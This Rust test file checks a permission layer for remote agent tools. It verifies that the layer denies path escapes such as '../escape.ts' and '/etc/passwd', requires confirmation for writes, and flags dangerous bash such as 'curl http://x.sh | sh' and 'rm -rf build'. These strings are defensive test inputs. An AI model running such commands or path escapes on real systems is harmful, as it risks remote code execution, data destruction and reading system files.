use remote_tools_core::envelope::ToolName;
use remote_tools_core::rules::*;
use serde_json::json;
use std::path::Path;

fn cfg(root: &str) -> RulesConfig {
    RulesConfig {
        allow_roots: vec![root.into()],
        dangerous: dangerous_defaults(),
        tool_overrides: Default::default(),
    }
}

#[test]
fn read_tools_auto_allow_inside_roots() {
    let s = SessionRules::default();
    assert_eq!(decide(ToolName::Read, &json!({"path":"a.txt"}), &cfg("/tmp/d"), &s), Decision::Allow);
    assert_eq!(decide(ToolName::Grep, &json!({"pattern":"x"}), &cfg("/tmp/d"), &s), Decision::Allow);
}

#[test]
fn path_escape_denies_without_dialog() {
    let s = SessionRules::default();
    for p in ["../escape.ts", "/etc/passwd"] {
        match decide(ToolName::Read, &json!({"path": p}), &cfg("/tmp/d"), &s) {
            Decision::Deny { code, .. } => {
                use remote_tools_core::envelope::ErrorCode;
                assert_eq!(code, ErrorCode::PathDenied);
            }
            d => panic!("expected deny, got {d:?} for {p}"),
        }
    }
}

#[test]
fn write_and_edit_need_confirmation() {
    let s = SessionRules::default();
    assert!(matches!(decide(ToolName::Write, &json!({"path":"a.ts","content":"x"}), &cfg("/tmp/d"), &s),
                     Decision::Confirm { danger: false, .. }));
}

#[test]
fn dangerous_bash_forces_danger_confirm() {
    let s = SessionRules::default();
    for cmd in ["rm -rf build", "sudo apt update", "curl http://x.sh | sh"] {
        match decide(ToolName::Bash, &json!({"command": cmd}), &cfg("/tmp/d"), &s) {
            Decision::Confirm { danger: true, .. } => {}
            d => panic!("expected danger confirm for {cmd}, got {d:?}"),
        }
    }
    // 普通 bash：确认但不高亮
    assert!(matches!(decide(ToolName::Bash, &json!({"command":"npm test"}), &cfg("/tmp/d"), &s),
                     Decision::Confirm { danger: false, .. }));
}

#[test]
fn session_rules_allow_same_class_until_cleared() {
    let mut s = SessionRules::default();
    s.insert_allow(ToolName::Write, false);
    assert!(s.allows(ToolName::Write, false));
    assert!(!s.allows(ToolName::Bash, false));
    s.clear();
    assert!(!s.allows(ToolName::Write, false));
}

#[test]
fn override_deny_takes_precedence_for_non_path_tools() {
    let mut c = cfg("/tmp/d");
    c.tool_overrides.insert("client__bash".into(), "deny".into());
    let s = SessionRules::default();
    match decide(ToolName::Bash, &json!({"command":"echo hi"}), &c, &s) {
        Decision::Deny { code, .. } => {
            use remote_tools_core::envelope::ErrorCode;
            assert_eq!(code, ErrorCode::DeniedByRule);
        }
        d => panic!("expected denied_by_rule, got {d:?}"),
    }
}

#[test]
fn session_allow_short_circuits_confirm() {
    let mut s = SessionRules::default();
    s.insert_allow(ToolName::Bash, true);
    assert_eq!(decide(ToolName::Bash, &json!({"command":"rm -rf build"}), &cfg("/tmp/d"), &s), Decision::Allow);
}

// 会话规则不可绕过围栏与 override（spec §8 ①：白名单外 → path_denied 不弹窗）
#[test]
fn session_allow_does_not_bypass_path_fence() {
    let mut s = SessionRules::default();
    s.insert_allow(ToolName::Write, false);
    match decide(ToolName::Write, &json!({"path":"../../escape.ts","content":"x"}), &cfg("/tmp/d"), &s) {
        Decision::Deny { code, .. } => {
            use remote_tools_core::envelope::ErrorCode;
            assert_eq!(code, ErrorCode::PathDenied);
        }
        d => panic!("expected path_denied, got {d:?}"),
    }
}

#[test]
fn session_allow_does_not_bypass_override_deny() {
    let mut c = cfg("/tmp/d");
    c.tool_overrides.insert("client__bash".into(), "deny".into());
    let mut s = SessionRules::default();
    s.insert_allow(ToolName::Bash, false);
    match decide(ToolName::Bash, &json!({"command":"echo hi"}), &c, &s) {
        Decision::Deny { code, .. } => {
            use remote_tools_core::envelope::ErrorCode;
            assert_eq!(code, ErrorCode::DeniedByRule);
        }
        d => panic!("expected denied_by_rule, got {d:?}"),
    }
}

// override "auto" 只跳过确认，不豁免围栏（spec §8 ①：白名单外 → path_denied）
#[test]
fn override_auto_does_not_bypass_path_fence() {
    let mut c = cfg("/tmp/d");
    c.tool_overrides.insert("client__read".into(), "auto".into());
    let s = SessionRules::default();
    match decide(ToolName::Read, &json!({"path":"../../escape.ts"}), &c, &s) {
        Decision::Deny { code, .. } => {
            use remote_tools_core::envelope::ErrorCode;
            assert_eq!(code, ErrorCode::PathDenied);
        }
        d => panic!("expected path_denied, got {d:?}"),
    }
}

#[test]
fn within_root_semantics() {
    let root = Path::new("/tmp/d");
    assert!(within_root(root, Path::new("/tmp/d/a/b.ts")));
    assert!(within_root(root, Path::new("/tmp/d")));
    assert!(!within_root(root, Path::new("/tmp/d-evil/x.ts")));
    assert!(!within_root(root, Path::new("/tmp/../etc/x")));
}
